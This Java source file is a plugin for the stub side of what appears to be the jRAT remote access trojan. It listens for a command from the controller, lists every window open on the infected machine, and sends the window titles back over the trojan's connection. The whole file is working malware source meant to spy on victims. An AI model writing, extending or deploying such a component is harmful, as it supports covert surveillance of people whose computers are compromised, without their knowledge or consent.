package se.jrat.plugin.window.stub;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.util.List;

import jrat.api.stub.StubPlugin;
import nativewindowlib.NativeWindow;
import nativewindowlib.WindowUtils;

public class WindowPlugin extends StubPlugin {
	
	public static final byte HEADER_LIST = -127;
	
	private DataInputStream dis;
	private DataOutputStream dos;

	@Override
	public void onStart() throws Exception {
		
	}

	@Override
	public void onDisconnect(Exception ex) throws Exception {
		
	}

	@Override
	public void onConnect(DataInputStream dis, DataOutputStream dos) throws Exception {
		this.dis = dis;
		this.dos = dos;
	}

	@Override
	public void onPacket(byte header) throws Exception {
		if (header == HEADER_LIST) {
			dos.writeByte(HEADER_LIST);
			
			List<NativeWindow> windows = WindowUtils.getWindows();
			
			dos.writeInt(windows.size());
			
			for (int i = 0; i < windows.size(); i++) {
				NativeWindow window = windows.get(i);
				
				writeString(window.getTitle());
			}
		}
	}

	@Override
	public void onEnable() throws Exception {
		
	}
	
	private void writeString(String s) throws Exception {
		if (dos != null) {
			dos.writeShort(s.length());
			dos.writeChars(s);
		}
	}

}
